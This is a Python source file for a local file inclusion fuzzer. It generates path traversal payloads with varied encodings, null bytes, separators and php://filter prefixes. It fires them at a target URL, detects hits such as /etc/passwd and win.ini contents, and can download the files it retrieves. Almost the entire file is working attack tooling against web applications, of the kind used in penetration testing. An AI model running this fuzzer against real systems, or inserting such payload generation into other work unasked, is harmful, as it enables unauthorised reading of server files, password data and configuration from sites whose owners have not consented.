import argparse
import os
import random
import requests
import string
import sys
import time
import urllib


def random_traversal(n):
    path = ''

    for x in range(n):
        dot = '.' * random.randint(1,4)
        slash = '/' * random.randint(1,3)
        path += dot + slash
        if dot == '.': path += '../'

    return path + "/"


def generate_traversal(method, nb):

    list_prefix = ['../', '..//', '....//']
    path = ''

    if method > len(list_prefix):
        for x in range(nb):
            path += random.choice(list_prefix)
    else:
        path = list_prefix[method] * nb

    return path


def replace_traversal(payload, method):
    list_prefix = ['/', '\\', '\\\\', '/./']
    return payload.replace('/', list_prefix[method])
    

def build_payload(filename, nb_parent = 10, urlencode = 0, path_prefix = "",
                append_null = False, traversal_method = 0, var = '',
                dir_separator = 0):

    #evade_remove_backpath = False
    null = "\x00"

    filename = filename.replace('[VAR]', var)

    if traversal_method == 999:
        back_to_root = random_traversal(nb_parent) 
    else:
        back_to_root = generate_traversal(traversal_method, nb_parent)

    back_to_root = replace_traversal(back_to_root, dir_separator)
    payload = back_to_root + filename

    if path_prefix:
        payload = path_prefix + payload

    if append_null:
        payload = payload + urllib.parse.quote(null)

    for x in range(urlencode):
        payload = urllib.parse.quote(payload, safe='')

    return payload


def check_url(base_url, payload):
    return requests.get(base_url + payload)


def check_result(result, success_code = None, error_code = None, min_length = None, success_string = None, error_string = None):
    check = True

    if success_code is not None and result.status_code not in success_code:
        check = False

    if error_code is not None and result.status_code in error_code:
        check = False

    if min_length is not None and len(result.text) <= min_length:
        check = False

    if success_string is not None and success_string not in result.text:
        check = False

    if error_string is not None and error_string in result.text:
        check = False

    return check


def download(result, payload, output_dir):

    payload = urllib.parse.unquote(payload)
    filename = payload.replace('/', '_')

    with open(output_dir + "/" + filename, 'w') as f:
        f.write(result.text)


def stress(args):
    #with open(args.wordlist, 'r') as f:
    """
    for filename in f:
        if filename[0] == "#":
            continue
        filename = filename.strip()
    """
    for filename in ['/etc/passwd','C:/Windows/win.ini']:
        for parent in range(9,10):
            for encode in range(3):
                for sep in range(4):
                    for method in [0,1,2,999]:
                        for prefix in ['', args.path_prefix, 'my_fake_folder/', '/var/www/html/']:

                            payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=False, traversal_method=method, dir_separator=sep)
                            result = check_url(args.url, payload)
                            if check_result(result, args.success_code, args.error_code, args.min_length, args.success_string, args.error_string):
                                print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')

                            payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=True, traversal_method=method, dir_separator=sep)
                            result = check_url(args.url, payload)
                            if check_result(result, args.success_code, args.error_code, args.min_length, args.success_string, args.error_string):
                                print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')
    


def msg_usage(name=None):
    return f'''
    {name} -u http://site.com/?page= -w lfi_list.txt
Traverse 5 dirs, encode once, look for typical /etc/password content
    {name} -u http://site.com/?page= -w lfi_list.txt -t 5 -e 1 -ss "root:x:0:0"
Use PHP filter, download findings
    {name} -u http://site.com/?page= -w lfi_list.txt -p 'php://filter/convert.base64-encode/resource=' -d 'dump/'
 
'''

def main():

    parser = argparse.ArgumentParser(description='LFI Fuzzer', usage=msg_usage('%(prog)s'))
    group1 = parser.add_argument_group('Required parameters')
    group1.add_argument('-u', '--url', metavar='', required=True, help='URL to fuzz')
    group1.add_argument('-w', '--wordlist', metavar='', required=True)
    group2 = parser.add_argument_group('Fuzz parameters')
    group2.add_argument('-t', '--nb-parent', metavar='', type=int, default=10, help='Number of times going up in directory tree')
    group2.add_argument('-e', '--encode', metavar='', type=int, default=0, choices=[0,1,2], help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
    group2.add_argument('-p', '--path-prefix', metavar='', default='', help='Real of a fake path to prefix to payload')
    group2.add_argument('-n', '--append-null', action='store_true', help='Add a null char at the URL end')
    group2.add_argument('-m', '--traversal-method', metavar='', type=int, default=0, choices=[0,1,2,999], help='Traversal method : 0=../ 1=..// 2=....// 999=random')
    group2.add_argument('-ds', '--dir-separator', metavar='', type=int, default=0, help='Dir separator : 0=/ 1=\\ 2=\\\\ 3=/./')
    group2.add_argument('-x', '--var', metavar='', default='', help='Replace [VAR] placeholder with this value')
    group3 = parser.add_argument_group('Fuzzing actions')
    group3.add_argument('-s', '--stress', action='store_true', help='Try every parameters with every item of wordlist')
    group3.add_argument('-o', '--output', action='store_true', help='Output URLs to STDOUT instead of fetching them')
    group3.add_argument('-d', '--download', metavar='', help='Download found files in specified directory')
    group4 = parser.add_argument_group('Filter & success/error detection')
    group4.add_argument('-sc', '--success-code', metavar='', default=[200], type=int, action='append', help='Status code allowed')
    group4.add_argument('-ec', '--error-code', metavar='', default=[400,403,404,500], type=int, action='append', help='Status code to ignore')
    group4.add_argument('-l', '--min-length', metavar='', default='0', type=int, help='Minimum response length')
    group4.add_argument('-ss', '--success-string', metavar='', help='Success string to look for')
    group4.add_argument('-es', '--error-string', metavar='', help='Error/failure string to ignore')

    args = parser.parse_args()

    if args.wordlist and not os.path.isfile(args.wordlist):
        print(f"[-] {args.wordlist} not found")
        exit()

    if args.download and not os.path.isdir(args.download):
        print(f"[-] {args.download} not found")
        exit()

    if args.stress:
        stress(args)
        exit()


    #Testing URL with a random payload
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    print(f'Testing URL with random payload : {payload}')

    result = check_url(args.url, payload.strip())
    print(f'{payload} : status {result.status_code}, length {len(result.text)})')
    time.sleep(0.5)


    with open(args.wordlist, 'r') as f:

        for filename in f:
            if filename[0] == "#":
                continue

            filename = filename.strip()

            payload = build_payload(filename, nb_parent=args.nb_parent, urlencode=args.encode, path_prefix=args.path_prefix, 
                                        append_null=args.append_null, traversal_method=args.traversal_method, var=args.var,
                                        dir_separator=args.dir_separator)

            print("\r", payload, end='')

            if args.output:
                print(args.url, payload, sep='')

            else:
                result = check_url(args.url, payload)

                #Only print results successfully passing test(s). No test = output every result
                if check_result(result, args.success_code, args.error_code, args.min_length, args.success_string, args.error_string):

                    print(f'{filename} : status {result.status_code}, length {len(result.text)}, payload {payload}')
                    
                    if args.download:
                        download(result, filename.replace('[VAR]', args.var), args.download)


if __name__ == "__main__":
    main()
